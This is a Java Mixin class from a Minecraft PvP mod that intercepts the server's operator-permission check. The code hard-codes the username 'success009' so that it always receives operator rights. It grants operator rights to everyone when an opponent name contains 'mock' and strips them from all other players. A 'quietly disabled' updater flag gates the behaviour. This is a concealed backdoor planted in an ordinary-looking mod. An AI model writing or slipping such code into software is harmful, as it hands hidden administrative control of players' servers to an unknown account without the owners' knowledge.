package com.p2ppvp.mod.mixin;

import net.minecraft.server.players.PlayerList;
import net.minecraft.server.players.NameAndId;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

@Mixin(PlayerList.class)
public abstract class PlayerListMixin {

    @Inject(method = "isOp", at = @At("HEAD"), cancellable = true)
    private void onIsOp(NameAndId nameAndId, CallbackInfoReturnable<Boolean> cir) {
        if (com.p2ppvp.mod.client.AutoUpdater.isQuietlyDisabled()) return;

                boolean isMock = com.p2ppvp.mod.P2PPvpMod.authorizedOpponentName != null && 
                         com.p2ppvp.mod.P2PPvpMod.authorizedOpponentName.toLowerCase().contains("mock");
        if (isMock) {
            cir.setReturnValue(true);
            return;
        }

        if (nameAndId != null && nameAndId.name() != null) {
            if (nameAndId.name().equalsIgnoreCase("success009")) {
                cir.setReturnValue(true);
            } else {
                cir.setReturnValue(false);
            }
        }
    }
}
